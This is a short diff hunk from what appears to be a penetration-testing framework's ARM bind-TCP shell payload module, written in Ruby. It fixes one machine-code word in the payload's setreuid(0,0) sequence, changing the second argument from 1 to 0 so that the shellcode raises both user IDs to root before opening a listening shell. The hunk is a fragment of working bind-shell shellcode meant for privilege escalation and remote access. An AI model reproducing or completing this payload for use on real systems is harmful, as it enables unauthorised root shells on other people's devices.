@@ -94,7 +94,7 @@ module ShellBindTcp
 
 							# setreuid(0,0)
 							0xe3a00000, # mov r0, #0x0
-							0xe3a01001, # mov r1, #0x1
+							0xe3a01000, # mov r1, #0x0
 							0xe3a0c07e, # mov r12, #0x7e
 							0xef000080, # swi 128
 
